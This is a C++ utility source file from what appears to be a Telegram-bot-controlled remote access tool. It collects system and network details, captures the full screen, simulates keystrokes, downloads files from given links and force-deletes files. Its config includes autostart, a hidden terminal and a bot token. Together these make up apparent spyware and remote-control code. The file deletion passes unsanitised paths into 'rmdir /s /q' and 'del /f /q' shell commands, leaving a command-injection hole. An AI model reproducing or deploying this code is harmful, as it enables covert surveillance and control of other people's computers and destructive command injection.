#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "tools.h"

#include <iostream>
#include <string>
#include <shlwapi.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <memory>
#include <array>
#include <exception>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <iptypes.h>
#include <iphlpapi.h>
#include <utility>
#include <vector>

#include <cpr/cpr.h>
#include <opencv2/opencv.hpp>
#include <nlohmann/json.hpp>

#include "telegram.h"
#include "globals.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")



using json = nlohmann::json;

namespace tools {
    namespace info {
        char getSysDiskLetter() {
            char letter[256 + 1];
            GetSystemDirectory(letter, sizeof(letter));
            return letter[0];
        }

        std::string getUsername() {
            std::string username = cmdOutput("echo %username%");
            return username.substr(0, username.size() - 1);
        }

        std::string cmdOutput(const char* cmd) {
            std::array<char, 128> buffer;
            std::string result;
            std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
            if (!pipe) {
                std::cerr << "popen() failed!\n";
                return "sth fucked up";
            }
            bool is_command_valid = false;
            while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
                is_command_valid = true;
                result += buffer.data();
            }

            if (!is_command_valid)
                return "command " + std::string(cmd) + "isn't valid";
            return result;
        }

        bool filExists(const std::string& name) {
            struct stat buffer;
            return (stat(name.c_str(), &buffer) == 0);
        }


        std::string getExeName() {
            // https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
            TCHAR buffer[MAX_PATH] = { 0 };
            TCHAR* out;
            DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
            GetModuleFileName(NULL, buffer, bufSize);
            out = PathFindFileName(buffer);
            return out;
        }

        std::string getHostname() {
            std::string buffer = cmdOutput("hostname");
            buffer[buffer.size() - 1] = ' ';
            return buffer;
        }

        std::string getPublicIp() {
            auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
            return response.text;
        }

        std::string getCursorPos() {
            POINT p;
            GetCursorPos(&p);
            return std::to_string(p.x) + "," + std::to_string(p.y);
        }

        std::string getDupnixPath() {
            // https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
            TCHAR buffer[MAX_PATH] = { 0 };
            DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
            GetModuleFileName(NULL, buffer, bufSize);
            return buffer;
        }

        bool isDir(const std::string& path) {
            struct stat s;
            if (stat(path.c_str(), &s) == 0)
                if (s.st_mode & S_IFDIR)
                    return true;

            return false;
        }

        std::string getUptime() {
            int uptime_h = (int)((double)clock()) / CLOCKS_PER_SEC / 3600;
            int uptime_m = (int)((double)clock()) / CLOCKS_PER_SEC / 60;
            uptime_m -= uptime_h * 60;
            if (uptime_m < 0)uptime_m = 0;
            return std::to_string(uptime_h) + "h" + std::to_string(uptime_m) + "m";
        }

        std::string DiskList() {
            std::string s = cmdOutput("wmic logicaldisk get caption");
            std::string output = "";
            for (int i = 7; i < s.size(); i++) {
                if (s[i] >= 65 && s[i] <= 90) {
                    output += s[i];
                    output += ", ";
                }
            }
            return output.substr(0, output.size() - 2);
        }

        std::vector<std::pair<std::string, std::string>> getLocalIp() {
            IP_ADAPTER_ADDRESSES* adapter_addresses(NULL);
            IP_ADAPTER_ADDRESSES* adapter(NULL);

            DWORD adapter_addresses_buffer_size = 16 * 1024;

            // Get adapter addresses
            for (int attempts = 0; attempts != 3; ++attempts) {
                adapter_addresses = (IP_ADAPTER_ADDRESSES*)malloc(adapter_addresses_buffer_size);

                DWORD error = ::GetAdaptersAddresses(AF_UNSPEC,
                    GAA_FLAG_SKIP_ANYCAST |
                    GAA_FLAG_SKIP_MULTICAST |
                    GAA_FLAG_SKIP_DNS_SERVER |
                    GAA_FLAG_SKIP_FRIENDLY_NAME,
                    NULL,
                    adapter_addresses,
                    &adapter_addresses_buffer_size);

                if (ERROR_SUCCESS == error) {
                    break;
                } else if (ERROR_BUFFER_OVERFLOW == error) {
                    // Try again with the new size
                    free(adapter_addresses);
                    adapter_addresses = NULL;
                    continue;
                } else {
                    // Unexpected error code - log and throw
                    free(adapter_addresses);
                    adapter_addresses = NULL;
                    return std::vector<std::pair<std::string, std::string>> { {"An Error ", "Occured"} };
                }
            }
            std::vector<std::pair<std::string, std::string>> LocalIp;
            // Iterate through all of the adapters
            for (adapter = adapter_addresses; NULL != adapter; adapter = adapter->Next) {
                // Skip loopback adapters
                if (IF_TYPE_SOFTWARE_LOOPBACK == adapter->IfType) continue;


                // Parse all IPv4 addresses
                for (IP_ADAPTER_UNICAST_ADDRESS* address = adapter->FirstUnicastAddress; NULL != address; address = address->Next) {
                    auto family = address->Address.lpSockaddr->sa_family;
                    if (AF_INET == family) {
                        SOCKADDR_IN* ipv4 = reinterpret_cast<SOCKADDR_IN*>(address->Address.lpSockaddr);
                        char str_buffer[16] = { 0 };
                        inet_ntop(AF_INET, &(ipv4->sin_addr), str_buffer, 16);

                        std::wstring shit(adapter->FriendlyName);
                        std::string normal(shit.begin(), shit.end());

                        if (normal == "Ethernet" || normal == "Wi-Fi") {
                            LocalIp.push_back({ normal, str_buffer });
                        }
                    }
                }
            }

            free(adapter_addresses);
            adapter_addresses = NULL;
            return LocalIp;
        }


        bool checkAdminRights() {
            BOOL fIsElevated = FALSE;
            HANDLE hToken = NULL;
            TOKEN_ELEVATION elevation;
            DWORD dwSize;

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
                printf("\n Failed to get Process Token :%d.", GetLastError());
                goto Cleanup;  // if Failed, we treat as False
            }


            if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
                printf("\nFailed to get Token Information :%d.", GetLastError());
                goto Cleanup;  // if Failed, we treat as False
            }

            fIsElevated = elevation.TokenIsElevated;

        Cleanup:
            if (hToken) {
                CloseHandle(hToken);
                hToken = NULL;
            }
            return fIsElevated;
        }

        json loadCfg() {
            std::ifstream loaddata;
            loaddata.open(CONFIG_FILENAME);

            if (!loaddata.good())
                throw std::runtime_error("can't open config file!");

            std::stringstream buffer;
            buffer << loaddata.rdbuf();

            loaddata.close();

            std::string raw_data = buffer.str();
            json data;

            try {
                data = json::parse(raw_data);
            }
            catch (...) {
                throw std::runtime_error("can't parse config file to json!");
            }
            return data;
        }
    }  // namespace info

    void CdToDefault() {
        std::filesystem::current_path(tools::info::getDupnixPath().substr(0, tools::info::getDupnixPath().size() - tools::info::getExeName().size()));
    }

    std::string randomString(int lenght) {
        srand((unsigned int)time(0));
        std::string random = "";
        while (lenght--) {
            char ran = rand() % 25 + 97;
            random += ran;
        }
        return random;
    }

    bool remove(const std::string& to_remove) {
        std::string to_remove_correct = to_remove;
        for (auto& e : to_remove_correct) {
            if (e == '/')
                e = '\\';
        }


        if (info::isDir(to_remove_correct)) {
            return !system(std::string("rmdir /s /q " + to_remove_correct).c_str());
        }

        return !system(std::string("del /f /q " + to_remove_correct).c_str());
    }

    int ChangeVolume(double nVolume, bool bScalar) {
        HRESULT hr = 0;
        bool decibels = false;
        bool scalar = false;
        double newVolume = nVolume;

        auto j = CoInitialize(NULL);
        IMMDeviceEnumerator* deviceEnumerator = NULL;
        hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
            __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
        IMMDevice* defaultDevice = NULL;

        hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
        deviceEnumerator->Release();
        deviceEnumerator = NULL;

        IAudioEndpointVolume* endpointVolume = NULL;
        hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
            CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
        defaultDevice->Release();
        defaultDevice = NULL;

        float currentVolume = 0;
        endpointVolume->GetMasterVolumeLevel(&currentVolume);

        hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);

        if (nVolume == -1)
            newVolume = currentVolume;

        if (bScalar == false)
            hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
        else if (bScalar == true)
            hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);

        endpointVolume->Release();

        CoUninitialize();

        return static_cast<int>(currentVolume * 100);
    }

    void update_cfg() {
        json data = info::loadCfg();
        AUTOSTART = data["autostart"];
        HIDE_TERMINAL = data["hide_terminal"];

        REFRESH = data["refresh_rate"];
        ID = data["id"];
        BOT_API = data["bot_token"];
        CHAT_ID = data["chat_id"];
        PATH = data["path"];
    }

    void changeCfg(json change) {
        json data;
        try {
            data = info::loadCfg();
            data.merge_patch(change);
        }
        catch (...) {
            std::cerr << "couldn't change config file";
            telegram::SendText("couldn't change config file");
            return;
        }

        std::ofstream write;
        write.open(CONFIG_FILENAME);
        write << data;
        write.close();

        update_cfg();
    }

    void press_key(char a, bool is_bigone) {
        if (is_bigone) {
            keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
            Sleep(5);
            keybd_event(VkKeyScan(a), 1, 0, 0);
            Sleep(5);
            keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
            keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        } else {
            keybd_event(VkKeyScan(a), 1, 0, 0);
            Sleep(5);
            keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
        }
    }

    bool DownloadFile(std::string link, std::string path) {
        auto ofstream = std::ofstream(path, std::ios::binary);
        auto session = cpr::Session();
        session.SetUrl(cpr::Url{ link });
        auto response = session.Download(ofstream);

        if (response.status_code != 200)
            return false;
        return true;
    }

    std::string toLowerCase(std::string s) {
        for (auto& e : s) {
            if (e >= 'A' and e <= 'Z') {
                e += 32;  // converts from uppercase to lowercase
            }
        }
        return s;
    }

    void pressSpecialKey(BYTE key, bool up) {
        keybd_event(key, 0x45, KEYEVENTF_EXTENDEDKEY | (up ? KEYEVENTF_KEYUP : 0), 0);
    }

    // https://superkogito.github.io/blog/2020/07/25/capture_screen_using_opencv.html
    cv::Mat captureScreenMat(HWND hwnd) {
        cv::Mat src;

        // get handles to a device context (DC)
        HDC hwindowDC = GetDC(hwnd);
        HDC hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
        SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);

        // define scale, height and width
        int screenx = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int screeny = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        // create mat object
        src.create(height, width, CV_8UC4);

        // create a bitmap
        HBITMAP hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
        BITMAPINFOHEADER bi = createBitmapHeader(width, height);

        // use the previously created device context with the bitmap
        SelectObject(hwindowCompatibleDC, hbwindow);

        // copy from the window device context to the bitmap device context
        StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, screenx, screeny, width, height, SRCCOPY);  // change SRCCOPY to NOTSRCCOPY for wacky colors !
        GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);            // copy from hwindowCompatibleDC to hbwindow

        // avoid memory leak
        DeleteObject(hbwindow);
        DeleteDC(hwindowCompatibleDC);
        ReleaseDC(hwnd, hwindowDC);

        return src;
    }
}  // namespace tools

BITMAPINFOHEADER createBitmapHeader(int width, int height) {
    BITMAPINFOHEADER  bi;

    // create a bitmap
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    return bi;
}

